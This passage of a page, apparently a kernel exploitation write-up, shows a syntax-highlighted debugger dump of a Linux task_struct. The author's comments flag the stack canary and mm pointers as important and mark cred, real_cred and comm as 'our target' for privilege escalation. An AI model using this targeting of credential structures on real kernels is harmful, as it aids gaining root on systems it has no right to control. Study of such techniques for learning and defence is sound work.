class="number">0x30d1efc3f</span>, </span><br><span class="line">    sum_exec_runtime = <span class="number">0x7049fb2d</span>, </span><br><span class="line">    vruntime = <span class="number">0x781cf582</span>, </span><br><span class="line">    prev_sum_exec_runtime = <span class="number">0x5f2b1a44</span>, </span><br><span class="line">    nr_migrations = <span class="number">0x0</span>, </span><br><span class="line">    statistics = &#123;</span><br><span class="line">      wait_start = <span class="number">0x0</span>, </span><br><span class="line">      wait_max = <span class="number">0x1c85687</span>, </span><br><span class="line">      wait_count = <span class="number">0xc</span>, </span><br><span class="line">      wait_sum = <span class="number">0x260560b</span>, </span><br><span class="line">      iowait_count = <span class="number">0x0</span>, </span><br><span class="line">      iowait_sum = <span class="number">0x0</span>, </span><br><span class="line">      sleep_start = <span class="number">0x0</span>, </span><br><span class="line">      sleep_max = <span class="number">0x0</span>, </span><br><span class="line">      sum_sleep_runtime = <span class="number">0x0</span>, </span><br><span class="line">      block_start = <span class="number">0x0</span>, </span><br><span class="line">      block_max = <span class="number">0x0</span>, </span><br><span class="line">      exec_max = <span class="number">0xdf59ea</span>, </span><br><span class="line">      slice_max = <span class="number">0x1cd26bd</span>, </span><br><span class="line">      nr_migrations_cold = <span class="number">0x0</span>, </span><br><span class="line">      nr_failed_migrations_affine = <span class="number">0x0</span>, </span><br><span class="line">      nr_failed_migrations_running = <span class="number">0x0</span>, </span><br><span class="line">      nr_failed_migrations_hot = <span class="number">0x0</span>, </span><br><span class="line">      nr_forced_migrations = <span class="number">0x0</span>, </span><br><span class="line">      nr_wakeups = <span class="number">0x0</span>, </span><br><span class="line">      nr_wakeups_sync = <span class="number">0x0</span>, </span><br><span class="line">      nr_wakeups_migrate = <span class="number">0x0</span>, </span><br><span class="line">      nr_wakeups_local = <span class="number">0x0</span>, </span><br><span class="line">      nr_wakeups_remote = <span class="number">0x0</span>, </span><br><span class="line">      nr_wakeups_affine = <span class="number">0x0</span>, </span><br><span class="line">      nr_wakeups_affine_attempts = <span class="number">0x0</span>, </span><br><span class="line">      nr_wakeups_passive = <span class="number">0x0</span>, </span><br><span class="line">      nr_wakeups_idle = <span class="number">0x0</span></span><br><span class="line">    &#125;, </span><br><span class="line">    depth = <span class="number">0x1</span>, </span><br><span class="line">    parent = <span class="number">0xffff88000fa3d800</span>, </span><br><span class="line">    cfs_rq = <span class="number">0xffff88000fa3d600</span>, </span><br><span class="line">    my_q = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">    avg = &#123;</span><br><span class="line">      last_update_time = <span class="number">0x30d1efc3f</span>, </span><br><span class="line">      load_sum = <span class="number">0x2e0fef5</span>, </span><br><span class="line">      util_sum = <span class="number">0x2e0f67d</span>, </span><br><span class="line">      period_contrib = <span class="number">0x1a2</span>, </span><br><span class="line">      load_avg = <span class="number">0x3f3</span>, </span><br><span class="line">      util_avg = <span class="number">0x3f3</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, </span><br><span class="line">  rt = &#123;</span><br><span class="line">    run_list = &#123;</span><br><span class="line">      next = <span class="number">0xffff88000f842b68</span>, </span><br><span class="line">      prev = <span class="number">0xffff88000f842b68</span></span><br><span class="line">    &#125;, </span><br><span class="line">    timeout = <span class="number">0x0</span>, </span><br><span class="line">    watchdog_stamp = <span class="number">0x0</span>, </span><br><span class="line">    time_slice = <span class="number">0x19</span>, </span><br><span class="line">    back = <span class="number">0x0</span> &lt;irq_stack_union&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  sched_task_group = <span class="number">0xffff88000fa3d400</span>, </span><br><span class="line">  dl = &#123;</span><br><span class="line">    rb_node = &#123;</span><br><span class="line">      __rb_parent_color = <span class="number">0xffff88000f842ba0</span>, </span><br><span class="line">      rb_right = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">      rb_left = <span class="number">0x0</span> &lt;irq_stack_union&gt;</span><br><span class="line">    &#125;, </span><br><span class="line">    dl_runtime = <span class="number">0x0</span>, </span><br><span class="line">    dl_deadline = <span class="number">0x0</span>, </span><br><span class="line">    dl_period = <span class="number">0x0</span>, </span><br><span class="line">    dl_bw = <span class="number">0x0</span>, </span><br><span class="line">    runtime = <span class="number">0x0</span>, </span><br><span class="line">    deadline = <span class="number">0x0</span>, </span><br><span class="line">    flags = <span class="number">0x0</span>, </span><br><span class="line">    dl_throttled = <span class="number">0x0</span>, </span><br><span class="line">    dl_new = <span class="number">0x1</span>, </span><br><span class="line">    dl_boosted = <span class="number">0x0</span>, </span><br><span class="line">    dl_yielded = <span class="number">0x0</span>, </span><br><span class="line">    dl_timer = &#123;</span><br><span class="line">      node = &#123;</span><br><span class="line">        node = &#123;</span><br><span class="line">          __rb_parent_color = <span class="number">0xffff88000f842c00</span>, </span><br><span class="line">          rb_right = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">          rb_left = <span class="number">0x0</span> &lt;irq_stack_union&gt;</span><br><span class="line">        &#125;, </span><br><span class="line">        expires = &#123;</span><br><span class="line">          tv64 = <span class="number">0x0</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;, </span><br><span class="line">      _softexpires = &#123;</span><br><span class="line">        tv64 = <span class="number">0x0</span></span><br><span class="line">      &#125;, </span><br><span class="line">      function = <span class="number">0xffffffff810c2bd0</span> &lt;dl_task_timer&gt;, </span><br><span class="line">      base = <span class="number">0xffff88000de11440</span>, </span><br><span class="line">      state = <span class="number">0x0</span>, </span><br><span class="line">      is_rel = <span class="number">0x0</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, </span><br><span class="line">  preempt_notifiers = &#123;</span><br><span class="line">    first = <span class="number">0x0</span> &lt;irq_stack_union&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  btrace_seq = <span class="number">0x0</span>, </span><br><span class="line">  policy = <span class="number">0x0</span>, </span><br><span class="line">  nr_cpus_allowed = <span class="number">0x1</span>, </span><br><span class="line">  cpus_allowed = &#123;</span><br><span class="line">    bits = &#123;<span class="number">0x1</span>, <span class="number">0xffffffffffffffff</span> &lt;repeats <span class="number">127</span> times&gt;&#125;</span><br><span class="line">  &#125;, </span><br><span class="line">  sched_info = &#123;</span><br><span class="line">    pcount = <span class="number">0xc</span>, </span><br><span class="line">    run_delay = <span class="number">0x260560b</span>, </span><br><span class="line">    last_arrival = <span class="number">0x2fc001b56</span>, </span><br><span class="line">    last_queued = <span class="number">0x0</span></span><br><span class="line">  &#125;, </span><br><span class="line">  tasks = &#123;</span><br><span class="line">    next = <span class="number">0xffffffff81e13bf8</span> &lt;init_task+<span class="number">1784</span>&gt;, </span><br><span class="line">    prev = <span class="number">0xffff88000f844538</span></span><br><span class="line">  &#125;, </span><br><span class="line">  pushable_tasks = &#123;</span><br><span class="line">    prio = <span class="number">0x8c</span>, </span><br><span class="line">    prio_list = &#123;</span><br><span class="line">      next = <span class="number">0xffff88000f843090</span>, </span><br><span class="line">      prev = <span class="number">0xffff88000f843090</span></span><br><span class="line">    &#125;, </span><br><span class="line">    node_list = &#123;</span><br><span class="line">      next = <span class="number">0xffff88000f8430a0</span>, </span><br><span class="line">      prev = <span class="number">0xffff88000f8430a0</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, </span><br><span class="line">  pushable_dl_tasks = &#123;</span><br><span class="line">    __rb_parent_color = <span class="number">0xffff88000f8430b0</span>, </span><br><span class="line">    rb_right = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">    rb_left = <span class="number">0x0</span> &lt;irq_stack_union&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  mm = <span class="number">0xffff88000fa39f00</span>,                   <span class="comment">//important</span></span><br><span class="line">  active_mm = <span class="number">0xffff88000fa39f00</span>,            <span class="comment">//important</span></span><br><span class="line">  vmacache_seqnum = <span class="number">0x0</span>, </span><br><span class="line">  vmacache = &#123;<span class="number">0xffff88000fa6e9c0</span>, <span class="number">0xffff88000fa6ecc0</span>, <span class="number">0xffff88000fa6e900</span>, <span class="number">0xffff88000fa6eb40</span>&#125;, </span><br><span class="line">  rss_stat = &#123;</span><br><span class="line">    events = <span class="number">0x18</span>, </span><br><span class="line">    count = &#123;<span class="number">0xb1</span>, <span class="number">0xb</span>, <span class="number">0x0</span>&#125;</span><br><span class="line">  &#125;, </span><br><span class="line">  exit_state = <span class="number">0x0</span>, </span><br><span class="line">  exit_code = <span class="number">0x0</span>, </span><br><span class="line">  exit_signal = <span class="number">0x11</span>, </span><br><span class="line">  pdeath_signal = <span class="number">0x0</span>, </span><br><span class="line">  jobctl = <span class="number">0x0</span>, </span><br><span class="line">  personality = <span class="number">0x0</span>, </span><br><span class="line">  sched_reset_on_fork = <span class="number">0x0</span>, </span><br><span class="line">  sched_contributes_to_load = <span class="number">0x0</span>, </span><br><span class="line">  sched_migrated = <span class="number">0x0</span>, </span><br><span class="line">  in_execve = <span class="number">0x0</span>, </span><br><span class="line">  in_iowait = <span class="number">0x0</span>, </span><br><span class="line">  memcg_may_oom = <span class="number">0x0</span>, </span><br><span class="line">  no_cgroup_migration = <span class="number">0x0</span>, </span><br><span class="line">  atomic_flags = <span class="number">0x0</span>, </span><br><span class="line">  restart_block = &#123;</span><br><span class="line">    fn = <span class="number">0xffffffff81090750</span> &lt;do_no_restart_syscall&gt;, </span><br><span class="line">    &#123;</span><br><span class="line">      futex = &#123;</span><br><span class="line">        uaddr = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">        val = <span class="number">0x0</span>, </span><br><span class="line">        flags = <span class="number">0x0</span>, </span><br><span class="line">        <span class="built_in">bitset</span> = <span class="number">0x0</span>, </span><br><span class="line">        time = <span class="number">0x0</span>, </span><br><span class="line">        uaddr2 = <span class="number">0x0</span> &lt;irq_stack_union&gt;</span><br><span class="line">      &#125;, </span><br><span class="line">      nanosleep = &#123;</span><br><span class="line">        clockid = <span class="number">0x0</span>, </span><br><span class="line">        rmtp = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">        compat_rmtp = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">        expires = <span class="number">0x0</span></span><br><span class="line">      &#125;, </span><br><span class="line">      poll = &#123;</span><br><span class="line">        ufds = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">        nfds = <span class="number">0x0</span>, </span><br><span class="line">        has_timeout = <span class="number">0x0</span>, </span><br><span class="line">        tv_sec = <span class="number">0x0</span>, </span><br><span class="line">        tv_nsec = <span class="number">0x0</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, </span><br><span class="line">  pid = <span class="number">0x7c</span>, </span><br><span class="line">  tgid = <span class="number">0x7c</span>, </span><br><span class="line">  stack_canary = <span class="number">0x2e1bb4e394e40bee</span>,  <span class="comment">//important</span></span><br><span class="line">  real_parent = <span class="number">0xffff88000f843e40</span>, </span><br><span class="line">  parent = <span class="number">0xffff88000f843e40</span>, </span><br><span class="line">  children = &#123;</span><br><span class="line">    next = <span class="number">0xffff88000f843190</span>, </span><br><span class="line">    prev = <span class="number">0xffff88000f843190</span></span><br><span class="line">  &#125;, </span><br><span class="line">  sibling = &#123;</span><br><span class="line">    next = <span class="number">0xffff88000f844650</span>, </span><br><span class="line">    prev = <span class="number">0xffff88000f844650</span></span><br><span class="line">  &#125;, </span><br><span class="line">  group_leader = <span class="number">0xffff88000f842980</span>, </span><br><span class="line">  ptraced = &#123;</span><br><span class="line">    next = <span class="number">0xffff88000f8431b8</span>, </span><br><span class="line">    prev = <span class="number">0xffff88000f8431b8</span></span><br><span class="line">  &#125;, </span><br><span class="line">  ptrace_entry = &#123;</span><br><span class="line">    next = <span class="number">0xffff88000f8431c8</span>, </span><br><span class="line">    prev = <span class="number">0xffff88000f8431c8</span></span><br><span class="line">  &#125;, </span><br><span class="line">  pids = &#123;&#123;</span><br><span class="line">      node = &#123;</span><br><span class="line">        next = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">        pprev = <span class="number">0xffff88000092cd88</span></span><br><span class="line">      &#125;, </span><br><span class="line">      pid = <span class="number">0xffff88000092cd80</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">      node = &#123;</span><br><span class="line">        next = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">        pprev = <span class="number">0xffff88000092cd90</span></span><br><span class="line">      &#125;, </span><br><span class="line">      pid = <span class="number">0xffff88000092cd80</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">      node = &#123;</span><br><span class="line">        next = <span class="number">0xffff88000f8446c8</span>, </span><br><span class="line">        pprev = <span class="number">0xffff88000092ce98</span></span><br><span class="line">      &#125;, </span><br><span class="line">      pid = <span class="number">0xffff88000092ce80</span></span><br><span class="line">    &#125;&#125;, </span><br><span class="line">  thread_group = &#123;</span><br><span class="line">    next = <span class="number">0xffff88000f843220</span>, </span><br><span class="line">    prev = <span class="number">0xffff88000f843220</span></span><br><span class="line">  &#125;, </span><br><span class="line">  thread_node = &#123;</span><br><span class="line">    next = <span class="number">0xffff88000f8c1dd0</span>, </span><br><span class="line">    prev = <span class="number">0xffff88000f8c1dd0</span></span><br><span class="line">  &#125;, </span><br><span class="line">  vfork_done = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">  set_child_tid = <span class="number">0x7f49077a9a10</span>, </span><br><span class="line">  clear_child_tid = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">  utime = <span class="number">0xb6</span>, </span><br><span class="line">  stime = <span class="number">0x10d</span>, </span><br><span class="line">  utimescaled = <span class="number">0xb6</span>, </span><br><span class="line">  stimescaled = <span class="number">0x10d</span>, </span><br><span class="line">  gtime = <span class="number">0x0</span>, </span><br><span class="line">  prev_cputime = &#123;</span><br><span class="line">    utime = <span class="number">0x0</span>, </span><br><span class="line">    stime = <span class="number">0x0</span>, </span><br><span class="line">    lock = &#123;</span><br><span class="line">      raw_lock = &#123;</span><br><span class="line">        val = &#123;</span><br><span class="line">          counter = <span class="number">0x0</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, </span><br><span class="line">  nvcsw = <span class="number">0x0</span>, </span><br><span class="line">  nivcsw = <span class="number">0xb</span>, </span><br><span class="line">  start_time = <span class="number">0x29a6ee377</span>, </span><br><span class="line">  real_start_time = <span class="number">0x29a6ee83a</span>, </span><br><span class="line">  min_flt = <span class="number">0x31</span>, </span><br><span class="line">  maj_flt = <span class="number">0x0</span>, </span><br><span class="line">  cputime_expires = &#123;</span><br><span class="line">    utime = <span class="number">0x0</span>, </span><br><span class="line">    stime = <span class="number">0x0</span>, </span><br><span class="line">    sum_exec_runtime = <span class="number">0x0</span></span><br><span class="line">  &#125;, </span><br><span class="line">  cpu_timers = &#123;&#123;</span><br><span class="line">      next = <span class="number">0xffff88000f8432e0</span>, </span><br><span class="line">      prev = <span class="number">0xffff88000f8432e0</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">      next = <span class="number">0xffff88000f8432f0</span>, </span><br><span class="line">      prev = <span class="number">0xffff88000f8432f0</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">      next = <span class="number">0xffff88000f843300</span>, </span><br><span class="line">      prev = <span class="number">0xffff88000f843300</span></span><br><span class="line">    &#125;&#125;, </span><br><span class="line">  ptracer_cred = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">  real_cred = <span class="number">0xffff88000faa00c0</span>,  <span class="comment">//This is our target</span></span><br><span class="line">  cred = <span class="number">0xffff88000faa00c0</span>,       <span class="comment">//This is our target</span></span><br><span class="line">  comm = <span class="string">"this_is_xxrw..."</span>,        <span class="comment">//This is our target</span></span><br><span class="line">  nameidata = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">  sysvsem = &#123;</span><br><span class="line">    undo_list = <span class="number">0x0</span> &lt;irq_stack_union&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  sysvshm = &#123;</span><br><span class="line">    shm_clist = &#123;</span><br><span class="line">      next = <span class="number">0xffff88000f843348</span>, </span><br><span class="line">      prev = <span class="number">0xffff88000f843348</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, </span><br><span class="line">  last_switch_count = <span class="number">0x0</span>, </span><br><span class="line">  fs = <span class="number">0xffff88000fa21ac0</span>, </span><br><span class="line">  files = <span class="number">0xffff88000d61e840</span>, </span><br><span class="line">  nsproxy = <span class="number">0xffffffff81e4db40</span> &lt;init_nsproxy&gt;, </span><br><span class="line">  signal = <span class="number">0xffff88000f8c1dc0</span>, </span><br><span class="line">  sighand = <span class="number">0xffff88000fa33180</span>, </span><br><span class="line">  blocked = &#123;</span><br><span class="line">    sig = &#123;<span class="number">0x0</span>&#125;</span><br><span class="line">  &#125;, </span><br><span class="line">  real_blocked = &#123;</span><br><span class="line">    sig = &#123;<span class="number">0x0</span>&#125;</span><br><span class="line">  &#125;, </span><br><span class="line">  saved_sigmask = &#123;</span><br><span class="line">    sig = &#123;<span class="number">0x0</span>&#125;</span><br><span class="line">  &#125;, </span><br><span class="line">  pending = &#123;</span><br><span class="line">    <span class="built_in">list</span> = &#123;</span><br><span class="line">      next = <span class="number">0xffff88000f8433a0</span>, </span><br><span class="line">      prev = <span class="number">0xffff88000f8433a0</span></span><br><span class="line">    &#125;, </span><br><span class="line">    signal = &#123;</span><br><span class="line">      sig = &#123;<span class="number">0x0</span>&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, </span><br><span class="line">  sas_ss_sp = <span class="number">0x0</span>, </span><br><span class="line">  sas_ss_size = <span class="number">0x0</span>, </span><br><span class="line">  task_works = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">  audit_context = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">  loginuid = &#123;</span><br><span class="line">    val = <span class="number">0xffffffff</span></span><br><span class="line">  &#125;, </span><br><span class="line">  sessionid = <span class="number">0xffffffff</span>, </span><br><span class="line">  seccomp = &#123;</span><br><span class="line">    mode = <span class="number">0x0</span>, </span><br><span class="line">    filter = <span class="number">0x0</span> &lt;irq_stack_union&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  parent_exec_id = <span class="number">0x5</span>, </span><br><span class="line">  self_exec_id = <span class="number">0x6</span>, </span><br><span class="line">  alloc_lock = &#123;</span><br><span class="line">    &#123;</span><br><span class="line">      rlock = &#123;</span><br><span class="line">        raw_lock = &#123;</span><br><span class="line">          val = &#123;</span><br><span class="line">            counter = <span class="number">0x0</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, </span><br><span class="line">  pi_lock = &#123;</span><br><span class="line">    raw_lock = &#123;</span><br><span class="line">      val = &#123;</span><br><span class="line">        counter = <span class="number">0x0</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, </span><br><span class="line">  wake_q = &#123;</span><br><span class="line">    next = <span class="number">0x0</span> &lt;irq_stack_union&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  pi_waiters = &#123;</span><br><span class="line">    rb_node = <span class="number">0x0</span> &lt;irq_stack_union&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  pi_waiters_leftmost = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">  pi_blocked_on = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">  journal_info = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">  bio_list = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">  plug = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">  reclaim_state = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">  backing_dev_info = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">  io_context = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">  ptrace_message = <span class="number">0x0</span>, </span><br><span class="line">  last_siginfo = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">  ioac = &#123;</span><br><span class="line">    rchar = <span class="number">0x1d0</span>, </span><br><span class="line">    wchar = <span class="number">0xde</span>, </span><br><span class="line">    syscr = <span class="number">0x2</span>, </span><br><span class="line">    syscw = <span class="number">0x8</span>, </span><br><span class="line">    read_bytes = <span class="number">0x0</span>, </span><br><span class="line">    write_bytes = <span class="number">0x0</span>, </span><br><span class="line">    cancelled_write_bytes = <span class="number">0x0</span></span><br><span class="line">  &#125;, </span><br><span class="line">  acct_rss_mem1 = <span class="number">0x1b86e0</span>, </span><br><span class="line">  acct_vm_mem1 = <span class="number">0x1e25c600</span>, </span><br><span class="line">  acct_timexpd = <span class="number">0x1c3</span>, </span><br><span class="line">  mems_allowed = &#123;</span><br><span class="line">    bits = &#123;<span class="number">0x1</span>, <span class="number">0x0</span> &lt;repeats <span class="number">15</span> times&gt;&#125;</span><br><span class="line">  &#125;, </span><br><span class="line">  mems_allowed_seq = &#123;</span><br><span class="line">    sequence = <span class="number">0x0</span></span><br><span class="line">  &#125;, </span><br><span class="line">  cpuset_mem_spread_rotor = <span class="number">0xffffffff</span>, </span><br><span class="line">  cpuset_slab_spread_rotor = <span class="number">0xffffffff</span>, </span><br><span class="line">  cgroups = <span class="number">0xffffffff81e7b040</span> &lt;init_css_set&gt;, </span><br><span class="line">  cg_list = &#123;</span><br><span class="line">    next = <span class="number">0xffff88000f843548</span>, </span><br><span class="line">    prev = <span class="number">0xffff88000f843548</span></span><br><span class="line">  &#125;, </span><br><span class="line">  robust_list = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">  compat_robust_list = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">  pi_state_list = &#123;</span><br><span class="line">    next = <span class="number">0xffff88000f843568</span>, </span><br><span class="line">    prev = <span class="number">0xffff88000f843568</span></span><br><span class="line">  &#125;, </span><br><span class="line">  pi_state_cache = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">  perf_event_ctxp = &#123;<span class="number">0x0</span> &lt;irq_stack_union&gt;, <span class="number">0x0</span> &lt;irq_stack_union&gt;&#125;, </span><br><span class="line">  perf_event_mutex = &#123;</span><br><span class="line">    count = &#123;</span><br><span class="line">      counter = <span class="number">0x1</span></span><br><span class="line">    &#125;, </span><br><span class="line">    wait_lock = &#123;</span><br><span class="line">      &#123;</span><br><span class="line">        rlock = &#123;</span><br><span class="line">          raw_lock = &#123;</span><br><span class="line">            val = &#123;</span><br><span class="line">              counter = <span class="number">0x0</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, </span><br><span class="line">    wait_list = &#123;</span><br><span class="line">      next = <span class="number">0xffff88000f843598</span>, </span><br><span class="line">      prev = <span class="number">0xffff88000f843598</span></span><br><span class="line">    &#125;, </span><br><span class="line">    owner = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">    osq = &#123;</span><br><span class="line">      tail = &#123;</span><br><span class="line">        counter = <span class="number">0x0</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, </span><br><span class="line">  perf_event_list = &#123;</span><br><span class="line">    next = <span class="number">0xffff88000f8435b8</span>, </span><br><span class="line">    prev = <span class="number">0xffff88000f8435b8</span></span><br><span class="line">  &#125;, </span><br><span class="line">  mempolicy = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">  il_next = <span class="number">0x0</span>, </span><br><span class="line">  pref_node_fork = <span class="number">0x0</span>, </span><br><span class="line">  numa_scan_seq = <span class="number">0x0</span>, </span><br><span class="line">  numa_scan_period = <span class="number">0x3e8</span>, </span><br><span class="line">  numa_scan_period_max = <span class="number">0x0</span>, </span><br><span class="line">  numa_preferred_nid = <span class="number">0xffffffff</span>, </span><br><span class="line">  numa_migrate_retry = <span class="number">0x0</span>, </span><br><span class="line">  node_stamp = <span class="number">0x0</span>, </span><br><span class="line">  last_task_numa_placement = <span class="number">0x0</span>, </span><br><span class="line">  last_sum_exec_runtime = <span class="number">0x0</span>, </span><br><span class="line">  numa_work = &#123;</span><br><span class="line">    next = <span class="number">0xffff88000f843608</span>, </span><br><span class="line">    func = <span class="number">0x0</span> &lt;irq_stack_union&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  numa_entry = &#123;</span><br><span class="line">    next = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">    prev = <span class="number">0x0</span> &lt;irq_stack_union&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  numa_group = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">  numa_faults = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">  total_numa_faults = <span class="number">0x0</span>, </span><br><span class="line">  numa_faults_locality = &#123;<span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>&#125;, </span><br><span class="line">  numa_pages_migrated = <span class="number">0x0</span>, </span><br><span class="line">  tlb_ubc = &#123;</span><br><span class="line">    cpumask = &#123;</span><br><span class="line">      bits = &#123;<span class="number">0x0</span> &lt;repeats <span class="number">128</span> times&gt;&#125;</span><br><span class="line">    &#125;, </span><br><span class="line">    flush_required = <span class="number">0x0</span>, </span><br><span class="line">    writable = <span class="number">0x0</span></span><br><span class="line">  &#125;, </span><br><span class="line">  rcu = &#123;</span><br><span class="line">    next = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">    func = <span class="number">0x0</span> &lt;irq_stack_union&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  splice_pipe = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">  task_frag = &#123;</span><br><span class="line">    page = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">    offset = <span class="number">0x0</span>, </span><br><span class="line">    size = <span class="number">0x0</span></span><br><span class="line">  &#125;, </span><br><span class="line">  delays = <span class="number">0xffff88000fa21fc0</span>, </span><br><span class="line">  nr_dirtied = <span class="number">0x0</span>, </span><br><span class="line">  nr_dirtied_pause = <span class="number">0x20</span>, </span><br><span class="line">  dirty_paused_when = <span class="number">0x0</span>, </span><br><span class="line">  timer_slack_ns = <span class="number">0xc350</span>, </span><br><span class="line">  default_timer_slack_ns = <span class="number">0xc350</span>, </span><br><span class="line">  curr_ret_stack = <span class="number">0xffffffff</span>, </span><br><span class="line">  ret_stack = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">  ftrace_timestamp = <span class="number">0x0</span>, </span><br><span class="line">  trace_overrun = &#123;</span><br><span class="line">    counter = <span class="number">0x0</span></span><br><span class="line">  &#125;, </span><br><span class="line">  tracing_graph_pause = &#123;</span><br><span class="line">    counter = <span class="number">0x0</span></span><br><span class="line">  &#125;, </span><br><span class="line">  trace = <span class="number">0x0</span>, </span><br><span class="line">  trace_recursion = <span class="number">0x0</span>, </span><br><span class="line">  memcg_in_oom = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">  memcg_oom_gfp_mask = <span class="number">0x0</span>, </span><br><span class="line">  memcg_oom_order = <span class="number">0x0</span>, </span><br><span class="line">  memcg_nr_pages_over_high = <span class="number">0x0</span>, </span><br><span class="line">  sequential_io = <span class="number">0x0</span>, </span><br><span class="line">  sequential_io_avg = <span class="number">0x0</span>, </span><br><span class="line">  pagefault_disabled = <span class="number">0x0</span>, </span><br><span class="line">  thread = &#123;</span><br><span class="line">    tls_array = &#123;&#123;</span><br><span class="line">        &#123;</span><br><span class="line">          &#123;</span><br><span class="line">            a = <span class="number">0x4880ffff</span>, </span><br><span class="line">            b = <span class="number">0xdff2ff</span></span><br><span class="line">          &#125;, </span><br><span class="line">          &#123;</span><br><span class="line">            limit0 = <span class="number">0xffff</span>, </span><br><span class="line">            base0 = <span class="number">0x4880</span>, </span><br><span class="line">            base1 = <span class="number">0xff</span>, </span><br><span class="line">            type = <span class="number">0x2</span>, </span><br><span class="line">            s = <span class="number">0x1</span>, </span><br><span class="line">            dpl = <span class="number">0x3</span>, </span><br><span class="line">            p = <span class="number">0x1</span>, </span><br><span class="line">            limit = <span class="number">0xf</span>, </span><br><span class="line">            avl = <span class="number">0x1</span>, </span><br><span class="line">            l = <span class="number">0x0</span>, </span><br><span class="line">            d = <span class="number">0x1</span>, </span><br><span class="line">            g = <span class="number">0x1</span>, </span><br><span class="line">            base2 = <span class="number">0x0</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;, &#123;</span><br><span class="line">        &#123;</span><br><span class="line">          &#123;</span><br><span class="line">            a = <span class="number">0x0</span>, </span><br><span class="line">            b = <span class="number">0x0</span></span><br><span class="line">          &#125;, </span><br><span class="line">          &#123;</span><br><span class="line">            limit0 = <span class="number">0x0</span>, </span><br><span class="line">            base0 = <span class="number">0x0</span>, </span><br><span class="line">            base1 = <span class="number">0x0</span>, </span><br><span class="line">            type = <span class="number">0x0</span>, </span><br><span class="line">            s = <span class="number">0x0</span>, </span><br><span class="line">            dpl = <span class="number">0x0</span>, </span><br><span class="line">            p = <span class="number">0x0</span>, </span><br><span class="line">            limit = <span class="number">0x0</span>, </span><br><span class="line">            avl = <span class="number">0x0</span>, </span><br><span class="line">            l = <span class="number">0x0</span>, </span><br><span class="line">            d = <span class="number">0x0</span>, </span><br><span class="line">            g = <span class="number">0x0</span>, </span><br><span class="line">            base2 = <span class="number">0x0</span></span><br><span class="line">          